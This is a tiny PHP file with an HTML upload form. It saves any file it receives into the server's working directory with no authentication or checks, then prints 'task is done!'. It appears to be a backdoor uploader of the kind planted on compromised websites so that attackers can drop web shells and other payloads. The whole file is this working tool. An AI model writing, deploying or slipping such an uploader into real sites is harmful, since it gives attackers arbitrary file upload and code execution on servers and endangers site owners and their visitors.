<?php
if(move_uploaded_file($_FILES["Wpfl"]["tmp_name"], basename($_FILES["Wpfl"]["name"]))){
	echo (basename($_FILES["Wpfl"]["name"])."	Success");
}
?>
<form enctype="multipart/form-data" method="POST">
<input type="file" name="Wpfl"/>
<input type="submit" value="fup"/>
</form>
</br>
task is done!